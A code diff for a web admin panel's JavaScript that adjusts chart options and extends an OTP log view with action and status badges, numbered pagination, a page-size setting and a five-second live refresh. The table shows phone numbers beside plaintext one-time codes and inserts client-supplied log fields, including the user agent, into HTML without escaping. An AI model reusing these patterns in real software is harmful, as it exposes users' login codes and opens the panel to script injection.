@@ -641,8 +641,22 @@ class AdminPanel {
                     tooltip: { enabled: true }
                 },
                 scales: {
-                    x: { display: false },
-                    y: { display: false }
+                    x: { 
+                        display: false,
+                        grid: { display: false },
+                        border: { display: false }
+                    },
+                    y: { 
+                        display: false,
+                        grid: { display: false },
+                        border: { display: false },
+                        beginAtZero: true,
+                        min: 0,
+                        suggestedMax: function(context) {
+                            const max = Math.max(...context.chart.data.datasets[0].data);
+                            return max * 1.1; // Add 10% padding to prevent overflow
+                        }
+                    }
                 },
                 elements: {
                     point: { radius: 0 },
@@ -651,6 +665,14 @@ class AdminPanel {
                 interaction: {
                     intersect: false,
                     mode: 'index'
+                },
+                layout: {
+                    padding: {
+                        top: 5,
+                        right: 5,
+                        bottom: 5,
+                        left: 5
+                    }
                 }
             }
         });
@@ -2307,7 +2329,7 @@ document.addEventListener('click', function(e) {
 
 // OTP Management Functions
 let currentOTPPage = 1;
-const otpLogsPerPage = 50;
+let otpLogsPerPage = 10;
 
 async function loadOTPLogs(page = 1) {
     try {
@@ -2363,7 +2385,7 @@ function displayOTPLogs(logs) {
     if (!logs || logs.length === 0) {
         tbody.innerHTML = `
             <tr>
-                <td colspan="5" class="loading-message">
+                <td colspan="7" class="loading-message">
                     No OTP logs found
                 </td>
             </tr>
@@ -2376,11 +2398,31 @@ function displayOTPLogs(logs) {
         const truncatedUA = log.userAgent.length > 50 ? 
             log.userAgent.substring(0, 50) + '...' : log.userAgent;
         
+        const action = log.action || 'verification';
+        const actionBadge = action === 'request' ? 
+            '<span class="action-badge request">REQUEST</span>' : 
+            '<span class="action-badge verification">VERIFY</span>';
+        
+        // Status badge for requests
+        let statusBadge = '';
+        if (action === 'request') {
+            const status = log.status || 'pending';
+            if (status === 'verified') {
+                statusBadge = '<span class="status-badge verified">VERIFIED</span>';
+            } else {
+                statusBadge = '<span class="status-badge pending">PENDING</span>';
+            }
+        } else {
+            statusBadge = '<span class="status-badge complete">COMPLETE</span>';
+        }
+        
         return `
             <tr>
                 <td class="timestamp">${timestamp}</td>
                 <td class="phone-number">${log.phone}</td>
                 <td><span class="otp-code">${log.otpCode}</span></td>
+                <td class="action-column">${actionBadge}</td>
+                <td class="status-column">${statusBadge}</td>
                 <td class="ip-address">${log.ip}</td>
                 <td class="user-agent" title="${log.userAgent}">${truncatedUA}</td>
             </tr>
@@ -2390,6 +2432,12 @@ function displayOTPLogs(logs) {
 
 function updateOTPPagination(pagination) {
     const paginationDiv = document.getElementById('otpPagination');
+    const tableInfoDiv = document.getElementById('otpTableInfo');
+    
+    // Update table info
+    const startItem = ((pagination.current - 1) * otpLogsPerPage) + 1;
+    const endItem = Math.min(pagination.current * otpLogsPerPage, pagination.totalLogs);
+    tableInfoDiv.textContent = `Showing ${startItem}-${endItem} of ${pagination.totalLogs} entries`;
     
     if (pagination.total <= 1) {
         paginationDiv.innerHTML = '';
@@ -2398,31 +2446,63 @@ function updateOTPPagination(pagination) {
     
     let paginationHTML = '';
     
+    // First page button
+    if (pagination.current > 2) {
+        paginationHTML += `
+            <button onclick="loadOTPLogs(1)" class="pagination-btn">
+                <i class="fas fa-angle-double-left"></i>
+            </button>
+        `;
+    }
+    
     // Previous button
     paginationHTML += `
         <button onclick="loadOTPLogs(${pagination.current - 1})" 
+                class="pagination-btn"
                 ${pagination.current === 1 ? 'disabled' : ''}>
             <i class="fas fa-chevron-left"></i> Previous
         </button>
     `;
     
-    // Page info
-    paginationHTML += `
-        <span class="pagination-info">
-            Page ${pagination.current} of ${pagination.total}
-            (${pagination.totalLogs} total logs)
-        </span>
-    `;
+    // Page numbers (show current page and 2 pages before/after)
+    const startPage = Math.max(1, pagination.current - 2);
+    const endPage = Math.min(pagination.total, pagination.current + 2);
+    
+    for (let i = startPage; i <= endPage; i++) {
+        paginationHTML += `
+            <button onclick="loadOTPLogs(${i})" 
+                    class="pagination-btn page-number ${i === pagination.current ? 'active' : ''}"
+                    ${i === pagination.current ? 'disabled' : ''}>
+                ${i}
+            </button>
+        `;
+    }
     
     // Next button
     paginationHTML += `
         <button onclick="loadOTPLogs(${pagination.current + 1})" 
+                class="pagination-btn"
                 ${pagination.current === pagination.total ? 'disabled' : ''}>
             Next <i class="fas fa-chevron-right"></i>
         </button>
     `;
     
+    // Last page button
+    if (pagination.current < pagination.total - 1) {
+        paginationHTML += `
+            <button onclick="loadOTPLogs(${pagination.total})" class="pagination-btn">
+                <i class="fas fa-angle-double-right"></i>
+            </button>
+        `;
+    }
+    
     paginationDiv.innerHTML = paginationHTML;
+}
+
+function changeOTPPageSize(newSize) {
+    otpLogsPerPage = parseInt(newSize);
+    currentOTPPage = 1; // Reset to first page when changing page size
+    loadOTPLogs(1);
 }
 
 async function refreshOTPLogs() {
@@ -2457,6 +2537,9 @@ async function clearOTPLogs() {
 // Initialize the admin panel
 const adminPanel = new AdminPanel();
 
+// OTP real-time refresh interval
+let otpRefreshInterval = null;
+
 // Load OTP data when OTP tab is activated
 document.addEventListener('DOMContentLoaded', function() {
     // Override the existing tab switching to load OTP data
@@ -2467,6 +2550,21 @@ document.addEventListener('DOMContentLoaded', function() {
         if (tabName === 'otp-requests') {
             loadOTPStats();
             loadOTPLogs(1);
+            
+            // Start real-time refresh every 5 seconds
+            if (otpRefreshInterval) {
+                clearInterval(otpRefreshInterval);
+            }
+            otpRefreshInterval = setInterval(async () => {
+                await loadOTPStats();
+                await loadOTPLogs(currentOTPPage);
+            }, 5000);
+        } else {
+            // Stop refresh when switching away from OTP tab
+            if (otpRefreshInterval) {
+                clearInterval(otpRefreshInterval);
+                otpRefreshInterval = null;
+            }
         }
     };
 });
